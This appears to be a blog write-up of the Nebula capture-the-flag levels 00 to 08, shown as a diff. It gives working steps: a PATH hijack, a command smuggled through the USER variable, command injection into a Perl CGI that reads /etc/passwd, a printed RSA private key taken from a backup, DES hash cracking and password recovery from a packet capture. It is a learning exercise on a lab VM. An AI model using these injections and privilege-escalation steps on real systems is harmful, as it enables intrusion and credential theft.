@@ -1,0 +1,411 @@
+<p>I started doing the challenges in Nebula. They are not as fun as boot2root VM:s but still entertaining. And I have learned some new stuff from it.<br />
+I have decided to write down all the levels in this one post, otherwise it would be too many short posts. So this is going to be a giant one, and sometimes way to much detail, and somtimes not enough, of well. Let's start.</p>
+<h2>Level 00</h2>
+<p>We just need to find the flag on this level.</p>
+<p>[code]<br />
+$ find / -user flag00 -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null<br />
+-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /bin/.../flag00<br />
+-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00<br />
+[/code]<br />
+Search for user flag00, with permission 4000, executable. List the<br />
+output. Throw stderr in /dev/null.</p>
+<p>[code]<br />
+cd /bin<br />
+cd &quot;...&quot;<br />
+./flag00<br />
+getflag<br />
+[/code]</p>
+<h2>Level 01</h2>
+<p>On this level we are provided with code written in C and the binary version of it. It can be found here: /home/flag01/flag01</p>
+<p>[code]<br />
+$ file flag01<br />
+flag01: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped<br />
+[/code]<br />
+So we know that it is a 32bit setuid-binary. So when we run the binary the code that gets executed gets executed as the user flag01.</p>
+<p>[code]<br />
+total 13<br />
+drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .<br />
+drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..<br />
+-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout<br />
+-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc<br />
+-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01<br />
+-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile<br />
+[/code]</p>
+<p>Since I am a total noob in C I am going to comment this code pretty heavy to understand what is going on.</p>
+<p>[code lang="c"]<br />
+#include &lt;stdlib.h&gt;<br />
+// This is what is says. C's standard library. Useful general<br />
+// purpose functions. Generating random numbers, conversions, memory allocation: malloc<br />
+// process control. It is from this lib that &quot;system&quot; is taken.</p>
+<p>#include &lt;unistd.h&gt;<br />
+// Provides access to POSIX API.<br />
+// Gives the programmer access to NULL pointer, and symbolic constants like SEEK_SET</p>
+<p>#include &lt;string.h&gt;<br />
+// A library for manipulating strings.</p>
+<p>#include &lt;sys/types.h&gt;<br />
+// This library gives access to different data-types. Like gid_t.</p>
+<p>#include &lt;stdio.h&gt;<br />
+// The standard input and output library.<br />
+// printf and scanf are among those functions. printf outputs, and scanf takes input.</p>
+<p>int main(int argc, char **argv, char **envp)<br />
+// Here we initiate the main function, we do this with three arguments.<br />
+// argc is the number of argumnets. Argument count. The count starts from the<br />
+// calling of the binary. So ./flag01 is the first argument.<br />
+// argv are the argumnets that the user inputs. In this program it appears to be none.<br />
+// envp is an array of the environment variables.<br />
+{</p>
+<p>  gid_t gid;<br />
+  uid_t uid;<br />
+// Here we declare two variables, but we don't assign them any value.<br />
+// We use the data-typs that come from sys/types-lib.<br />
+// The data-types are group-id and user-id.</p>
+<p>  gid = getegid();<br />
+  uid = geteuid();</p>
+<p>// This gets the group-id and user-id of the current user. Which is flag01.<br />
+// And we assign the the value to the previously created variables.</p>
+<p>  setresgid(gid, gid, gid);<br />
+  setresuid(uid, uid, uid);</p>
+<p>// So this sets the real, effective and saved uID.</p>
+<p>  system(&quot;/usr/bin/env echo and now what?&quot;);</p>
+<p>// This uses the system-function, which let us use the unix-commands/programs.<br />
+// The commands run are first printing the environment variables, and then it echos &quot;and now what?&quot;</p>
+<p>}<br />
+[/code]</p>
+<p>How can this then be exploited? Since there is no user-input.<br />
+So I figure that I can overwrite the echo-command with a command that I call echo, but does something else.</p>
+<p>This kind of explains the way to do this.<br />
+<a href="http://unix.stackexchange.com/questions/29608/why-is-it-better-to-use-usr-bin-env-name-instead-of-path-to-name-as-my">link</a></p>
+<p>So I wrote that program in bash<br />
+[code lang="bash"]<br />
+#!/bin/bash<br />
+/bin/bash<br />
+[/code]</p>
+<p>Then chmod +x echo, and export PATH=/tmp:$PATH. Now, it is important here to add the echo to the beginning of the PATH-variable, otherwise it will execute the normal echo.</p>
+<p>[code]<br />
+./flag01<br />
+whoami<br />
+flag01<br />
+[/code]<br />
+We got the flag!</p>
+<h2>Level 02</h2>
+<p>So on this level we have another setuid to play with.</p>
+<p>[code]<br />
+cd /home/flag02<br />
+level02@nebula:/home/flag02$ file flag02<br />
+flag02: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped<br />
+[/code]</p>
+<p>Let's run it and see what happens.</p>
+<p>[code]<br />
+level02@nebula:/home/flag02$ ./flag02<br />
+about to call system(&quot;/bin/echo level02 is cool&quot;)<br />
+level02 is cool<br />
+[/code]<br />
+This looks a bit like the first level. But let's analyze the code.</p>
+<p>[code lang="c"]<br />
+#include &lt;stdlib.h&gt;<br />
+// Standard-lib.</p>
+<p>#include &lt;unistd.h&gt;<br />
+// Lib to get getegid()</p>
+<p>#include &lt;string.h&gt;<br />
+// Lib to manipulate strings</p>
+<p>#include &lt;sys/types.h&gt;<br />
+// Get new data-types, like gid_t</p>
+<p>#include &lt;stdio.h&gt;<br />
+// Standard i/o. printf, scanf for example</p>
+<p>int main(int argc, char **argv, char **envp)<br />
+{<br />
+  char *buffer;</p>
+<p>// Declare the variable buffer.</p>
+<p>  gid_t gid;<br />
+  uid_t uid;</p>
+<p>// Declare variables.</p>
+<p>  gid = getegid();<br />
+  uid = geteuid();</p>
+<p>// Assign uID and gID into the created varibles.</p>
+<p>  setresgid(gid, gid, gid);<br />
+  setresuid(uid, uid, uid);</p>
+<p>// Set UID.</p>
+<p>  buffer = NULL;</p>
+<p>// Assign the value NULL to the buffer-varible.</p>
+<p>  asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));<br />
+// Lets break it down.<br />
+// asprintf auto-allocate memory, it doesn't have to receive a specific buffer-size.<br />
+// it acquires it dynamically. In a way it is a way to defend against buffer overflow. Since the buffer cant be overflown because it is dynamic, I think.<br />
+// asprinf calculates the length of the string, allocates the amount of memory<br />
+// and then writes the string into that memory.</p>
+<p>  printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);</p>
+<p>// So, the asprintf takes the getenv-username and inputs it into the buffer.<br />
+// Then we make a system-call using that buffer.</p>
+<p>  system(buffer);<br />
+}<br />
+[/code]</p>
+<p>Okay, so no user-input is possible. So the solution will be elsewhere.<br />
+So we make a system-call that is the following:<br />
+"/bin/echo username (taken from en-var) is cool"</p>
+<p>So the solution that comes to mind is to insert a username that would be something like<br />
+the following: hello &amp;&amp; /bin/bash # echo</p>
+<p>So I set the username in my environment variable like this:<br />
+[code]<br />
+USER=&quot;&amp;&amp; /bin/bash #&quot;<br />
+[/code]<br />
+Then I ran the script, and it gave me the shell, and<br />
+ then I could just run getflag.</p>
+<h2>Level 03</h2>
+<p>So on this level we have one file and one directory.</p>
+<p>[code]<br />
+level03@nebula:/home/flag03$ ls -lah<br />
+total 5.5K<br />
+drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .<br />
+drwxr-xr-x 1 root   root     180 2012-08-27 07:18 ..<br />
+-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout<br />
+-rw-r--r-- 1 flag03 flag03  3.3K 2011-05-18 02:54 .bashrc<br />
+-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile<br />
+drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d<br />
+-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh<br />
+[/code]<br />
+The dir is read and writable. And the writable.sh-file looks like this:</p>
+<p>[code lang="bash"]<br />
+#!/bin/sh<br />
+for i in /home/flag03/writable.d/* ;<br />
+	(ulimit -t 5; bash -x &quot;$i&quot;)<br />
+	rm -f &quot;$i&quot;<br />
+done<br />
+[/code]</p>
+<p>So here we can se that it takes all the scripts in writable.d and executes them, every few minutes, with a cronjob.<br />
+So after a lot of work, and a lot of testing. Like copying the sh and much other. i realized I didn't have to get a shell, all i need is to execute getflag on the machine.</p>
+<p>So I just wrote the following script:<br />
+[code]<br />
+#!/bin/bash<br />
+getflag &gt; /tmp/flaggan.txt<br />
+[/code]</p>
+<p>I also tried to copy the shell from the flag03-user and give me permissions to use it, but it didn't work. Not really sure why. But anyways, I got the flag.</p>
+<h2>Level 04</h2>
+<p>"About<br />
+This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)<br />
+To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04."</p>
+<p>[code lang="c"]<br />
+#include &lt;stdlib.h&gt;<br />
+// Standard lib</p>
+<p>#include &lt;unistd.h&gt;<br />
+// getresid comes from here i think</p>
+<p>#include &lt;string.h&gt;<br />
+// Lib to manipulate strings</p>
+<p>#include &lt;sys/types.h&gt;<br />
+// Includes the datatype guid</p>
+<p>#include &lt;stdio.h&gt;<br />
+// Standard I/O</p>
+<p>#include &lt;fcntl.h&gt;<br />
+// The file control-options.<br />
+// To input output files, open them, close them, open dirs etc</p>
+<p>int main(int argc, char **argv, char **envp)<br />
+{<br />
+  char buf[1024];<br />
+// Here the buffer. The buffer is a kind of intermediare between memory and program.<br />
+// So the buffer have a maximum of 1024 bytes. That is one kilobyte.</p>
+<p>  int fd, rc;<br />
+// Here we declare two variables.</p>
+<p>  if(argc == 1) {<br />
+    // What to do if there is only one cli-argument.<br />
+      printf(&quot;%s [file to read]\n&quot;, argv[0]);<br />
+      exit(EXIT_FAILURE);<br />
+    // EXIT_FAILURE comes from some std lib.<br />
+    // This seems to be mostly harmless.<br />
+  }</p>
+<p>  if(strstr(argv[1], &quot;token&quot;) != NULL) {<br />
+    // So this occurs only if the variable name is token.<br />
+    // strstr evaluates if the first argument contains anything from the second.<br />
+    // So we can't ever read any file that contains the word token in it.<br />
+      printf(&quot;You may not access '%s'\n&quot;, argv[1]);<br />
+      exit(EXIT_FAILURE);<br />
+  }</p>
+<p>  fd = open(argv[1], O_RDONLY);<br />
+  // Here we initialize and declare the fd variable.<br />
+  // It appears to open the file, in a read-only manner, and then save it in<br />
+  // the variable fd.</p>
+<p>  if(fd == -1) {<br />
+    // This statement fires if a file doesn't exist, I think.<br />
+      err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);<br />
+  }</p>
+<p>  rc = read(fd, buf, sizeof(buf));</p>
+<p>// So here we take the input file, and read it. The buffer-size is here.</p>
+<p>  if(rc == -1) {<br />
+    // If the file somehow doesn't exists it throws this error.<br />
+      err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);<br />
+  }</p>
+<p>  write(1, buf, rc);<br />
+  // Here we write to standard out (the 1 indicates it).<br />
+}</p>
+<p>[/code]<br />
+I started trying to encode the file name and some other stuff, that didn't work. Then it hit me. I can just create a link.</p>
+<p>[code]<br />
+level04@nebula:/tmp/04$ ln -s /home/flag04/token ./test<br />
+level04@nebula:/tmp/04$ ls<br />
+test  test.sh<br />
+level04@nebula:/tmp/04$ /home/flag04/flag04 ./test<br />
+06508b5e-8909-4f38-b630-fdb148a848a2<br />
+[/code]<br />
+Wohoo, it worked!</p>
+<h2>Level 5</h2>
+<p>About<br />
+Check the flag05 home directory. You are looking for weak directory permissions<br />
+To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>
+<p>So I just read the files.<br />
+[code]<br />
+level05@nebula:/home/flag05/.backup$ tar -Oxf backup-19072011.tgz .ssh/id_rsa.pub</p>
+<p>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLAINcUvucamDG5PzLxljLOJ/nrkzot7EQJ9pEWXoQJC0/ZWm+ezhFHQd5UWlkwPZ2FBDvqxdcrgmmHT/FVGBjK0XWGwIkuJ50nf5pbJExi2SC9kNMMMP2VgY/OxvcUuoGhzEISlgkuu4hJjVh3NeliAgERVzxKCrxSvW48wcAxg4v5vceBra6lY7u8FT2D3VIsHogzKN77Z2g7k2qY82A0vOqw82e/h6IXLjpYwBur0rm0/u3GFB1HFhnAxuGcn4IsnQSBdQCB2S+eOUZ4PmiQ/rUSHuVvMeLCzrxKR+UG9zDwoCwwXpNJehAQJGCiL3JzBNnLjFaylSqKP6xj7cR user@wwwbugs<br />
+[/code]</p>
+<p>[code]<br />
+level05@nebula:/home/flag05/.backup$ tar -Oxf backup-19072011.tgz .ssh/id_rsa<br />
+-----BEGIN RSA PRIVATE KEY-----<br />
+MIIEowIBAAKCAQEAywCDXFL7nGpgxuT8y8ZYyzif565M6LexECfaRFl6ECQtP2Vp<br />
+vns4RR0HeVFpZMD2dhQQ76sXXK4Jph0/xVRgYytF1hsCJLiedJ3+aWyRMYtkgvZD<br />
+TDDD9lYGPzsb3FLqBocxCEpYJLruISY1YdzXpYgIBEVc8Sgq8Ur1uPMHAMYOL+b3<br />
+Hga2upWO7vBU9g91SLB6IMyje+2doO5NqmPNgNLzqsPNnv4eiFy46WMAbq9K5tP7<br />
+txhQdRxYZwMbhnJ+CLJ0EgXUAgdkvnjlGeD5okP61Eh7lbzHiws68SkflBvcw8KA<br />
+sMF6TSXoQECRgoi9ycwTZy4xWspUqij+sY+3EQIDAQABAoIBAAGir2w+/ufzs3Pm<br />
+xGKf5nc8rY0gSl5VnIeUyp1iWylmITcxifiO5ZUo9rZzgXXeWB37a2eC6V1Fya4c<br />
+7jaYx24FGzruXMYO9rfZzgLrbQAJL3YepcwnWGzTpJk90Kulv1zuGecHMk6ZcvGx<br />
+bRysutAKmIXwSR9oQ3BOOkyTKKtI6YeKSnUNU1KVO1t//ps2wFcfXRFb17prpokx<br />
+5clWwfUYRLBQlB4XjBIJ3tswpyC0PNOFfzoF+VeUlN9XZFrL0JWHX1F9DDOFJYL5<br />
+bXw7zwhjEvZ0/qOvZSJiH4lkbmANsBeMNY/JOGV6T7dWthKBGehCnupeADZVaSeo<br />
+Qlysa0ECgYEA6x4FwgpeqNtNGeCcSAUtoviTYMD5LfMEpY8t9eGdRpzw1CDlmG9x<br />
+k1LgzE3eA0qlJYx5NNqYEefIPVLdmSuSGS/5KqHeB8Ph7+WqLmguwIIIrfRJoPaD<br />
+ON2XqLU6YzAEazTrXnqALjOvP3qdN57xK0zoBAfYlkXJRgMYE1S23YsCgYEA3QhF<br />
+Fl11csPc2Yyz/7+9MG9JnOckYvuir+bf3fj/HEuIC9ylwXd4GfSLAW02Sg8DlfRh<br />
+M7MxCW9OEWtKgUtHe3fGc6/6X1yF7QfeAYZm8UX/fo6PxuX++mvfPxM4i6vRjgzB<br />
+Qy8WisqTK9nLZO+hEdPoVqalz0iUsvu2umz0CVMCgYAsNoUWrCSI1FR3XUmGMZMX<br />
+Zm8wbpltDpn9GCOobTjKIpEXEuiZ9bsB3T/wq2Poco0DtprEWabnFxMMlRyexRbA<br />
+LclJPw8lnqxKFIIgH+9KvCktrRZ7cl/SvbjbPNkx9cGe92Cbb6XTCl0WLtSJtRXc<br />
+8qVevKr59z2WMNbCK9gHaQKBgQDRaQNjpBohKFX2OytSU8uftuBMamV77iJ9e0SA<br />
+Hmc83IbBjkPwnwrHtHt6V4lG8yCXktgAznXYFX8mW7tT8gmAfcMkWgbhEFzGbFy2<br />
+nyqqzoG42sJ3U/KWOVtifAhns9qvNYBo8ZTu2+xBcHAWaj31EQqgBfU0BPT0+ixu<br />
+RcmThwKBgAi0ej7ylHhtwODQGghRmDpxEx9deJ0jilM2EnqIecJj5jnPW8BKDgV4<br />
+Dc1QljBeCQ1r30DGYmOIazbhm+orm4df6HWPayRhNBlkmulqTs5GHvLMPjcKMB0k<br />
+0Xna7QOtBAnzoHpLcrfvBdfRNE1eC87YkPUhmm5hBgG0+TeMmWgr<br />
+-----END RSA PRIVATE KEY-----<br />
+[/code]<br />
+Then I saved it down and sshed into the flag-user.<br />
+[code]<br />
+level05@nebula:/tmp/05/.ssh$ ssh -i id_rsa flag05@192.168.1.105<br />
+[/code]</p>
+<h2>Level 06</h2>
+<p>Old unix-passord-config. Okay, I know that passowrd were stored in /etc/passwd before they where stored in shadow.</p>
+<p>[code]<br />
+cat /etc/passwd<br />
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh<br />
+[/code]<br />
+Looks like it can be done with john the ripper.</p>
+<p>So I just copy-pasted the hash into a file and then ran john on it like this</p>
+<p>[code]<br />
+ $ john level06Hash<br />
+Using default input encoding: UTF-8<br />
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])<br />
+Press 'q' or Ctrl-C to abort, almost any other key for status<br />
+hello            (?)<br />
+1g 0:00:00:00 DONE 2/3 (2016-05-08 11:29) 2.777g/s 355.5p/s 355.5c/s 355.5C/s 123456..marley<br />
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br />
+Session completed<br />
+[/code]<br />
+So that was easy.</p>
+<h2>Level 07</h2>
+<p>This level was a bit tricky. It is about teching command injection.<br />
+So these articles were really useful.<br />
+<a href="http://www.golemtechnologies.com/articles/shell-injection">link1</a><br />
+<a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_%28OTG-INPVAL-013%29">link2</a></p>
+<p>So we have a few files.<br />
+.lesshst - that the history from the program less</p>
+<p>[code]<br />
+level07@nebula:~$ cat .viminfo<br />
+# File marks:<br />
+'0  1  0  ~/index.cgi?Host=|getflag|<br />
+'1  1  0  ~/index.cgi</p>
+<p># Jumplist (newest first):<br />
+-'  1  0  ~/index.cgi?Host=|getflag|<br />
+-'  1  0  ~/index.cgi<br />
+-'  1  0  ~/index.cgi</p>
+<p># History of marks within files (newest to oldest):</p>
+<p>&gt; ~/index.cgi?Host=|getflag|<br />
+	&quot;	1	0<br />
+[/code]</p>
+<p>And here is the cgi-code.<br />
+[code lang="perl"]<br />
+  #!/usr/bin/perl</p>
+<p>  use CGI qw{param};</p>
+<p>  print &quot;Content-type: text/html\n\n&quot;;</p>
+<p>  sub ping {<br />
+    $host = $_[0];</p>
+<p>    print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);</p>
+<p>    @output = `ping -c 3 $host 2&gt;&amp;1`;<br />
+    foreach $line (@output) { print &quot;$line&quot;; }</p>
+<p>    print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);</p>
+<p>  }</p>
+<p>  # check if Host set. if not, display normal page, etc</p>
+<p>  ping(param(&quot;Host&quot;));<br />
+[/code]<br />
+I had never really looked at perl-code before. But it kind of made some sense I guess. </p>
+<p>The config-file specified a port<br />
+[code]<br />
+# Specifies an alternate port number to listen on.<br />
+port=7007<br />
+dir=/home/flag07<br />
+[/code]<br />
+So I found that port, and started curling to se what I could run. After a lot of trial and error<br />
+I found a way to do it:</p>
+<p>curl "http://nebula.dev:7007/index.cgi?Host=www.google.com|getflag"<br />
+I also learned that you have to encode spaces correct otherwise the sever will get all confused. So if you wanna run any command with spaces you do it like this:<br />
+http://nebula.dev:7007/index.cgi?Host=%3Bcat%20/etc/passwd</p>
+<p>I had to encode the semicolon. That was the key to it!</p>
+<h2>Level 08</h2>
+<p>This is for sure my favorite level so far. I really enjoy analyzing packets.<br />
+So first I moved the pcap-file to my computer with netcat, and then I opened it up in wireshark.</p>
+<p>There was no http-requests. So I guess this traffic was not on the web.</p>
+<p>There are two machines talking:<br />
+59.233.235.218 - 39247<br />
+59.233.235.223 - 12121</p>
+<p>So looking at the packets we can tell that the machines are in Bejing, both of them. The source and destination corrdinates show that they are in the same place.<br />
+After looking up the ports I found this:<br />
+http://www.speedguide.net/port.php?port=12121<br />
+[code]<br />
+12121 	tcp 	trojans 	Backdoor.Balkart (2004.09.02) - a backdoor trojan horse that can act as a HTTP proxy or FTP server</p>
+<p>Port is also IANA registered for NuPaper Session Service 	SG<br />
+12121 	tcp,udp 	nupaper-ss 	NuPaper Session Service 	IANA<br />
+12121 	tcp 	threat 	Balkart<br />
+[/code]<br />
+Even though it doesn't really say in the challenge what kind of traffic this is, I like to image that it was someone who had infected the 12121 computer with the Balkart-trojan. <a href="https://www.symantec.com/security_response/writeup.jsp?docid=2004-090212-3607-99">This one</a>. But it doesn't really matter, it is irrelevant for this challenge.</p>
+<p>So I went over the packets and found some interesting ones.<br />
+[code]<br />
+ #'<br />
+ 0000   ff fa 20 00 33 38 34 30 30 2c 33 38 34 30 30 ff  .. .38400,38400.<br />
+ 0010   f0 ff fa 23 00 53 6f 64 61 43 61 6e 3a 30 ff f0  ...#.SodaCan:0..<br />
+ 0020   ff fa 27 00 00 44 49 53 50 4c 41 59 01 53 6f 64  ..'..DISPLAY.Sod<br />
+ 0030   61 43 61 6e 3a 30 ff f0 ff fa 18 00 78 74 65 72  aCan:0......xter<br />
+ 0040   6d ff f0                                         m..</p>
+<p>  38400,38400#SodaCan:0'DISPLAYSodaCan:0xterm<br />
+  &quot;&quot;bb	B<br />
+1!<br />
+[/code]<br />
+But I couldn't piece it all together. So after analyzing every single poacker separtely, I realized that the packages come and go in different<br />
+order, an order that doesn't make sense. So I learned something reaally useful. Right-click on a package and then<br />
+click on: follow, and then tcp-stream. This way we can see the full interaction, all packets combined to one.<br />
+[code]<br />
+..%..%..&amp;..... ..#..'..$..&amp;..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm..........&quot;........!........&quot;..&quot;.....b........b....	B.<br />
+..............................1.......!..&quot;......&quot;......!...........&quot;........&quot;..&quot;.............	..<br />
+.....................<br />
+Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)</p>
+<p>..wwwbugs login: l.le.ev.ve.el.l8.8<br />
+level8<br />
+..<br />
+Password: backdoor...00Rm8.ate</p>
+<p>Password: backd00Rmate<br />
+.<br />
+..<br />
+Login incorrect<br />
+wwwbugs login:<br />
+[/code]<br />
+So the password looked pretty strange. And it didn't work. But after I checked the tcp-stram in hex it became clear that the dot's in the password was f7 in hex. f7 represents DEL. So every f7 was the user deleting letters. I guess he/she has problem remembering his/her own password.<br />
+So this:<br />
+Password: backdoor...00Rm8.ate<br />
+Became this:<br />
+Password: backd00Rmate</p>
+<h2>Level 09</h2>
+<p>I will continue some other day.</p>
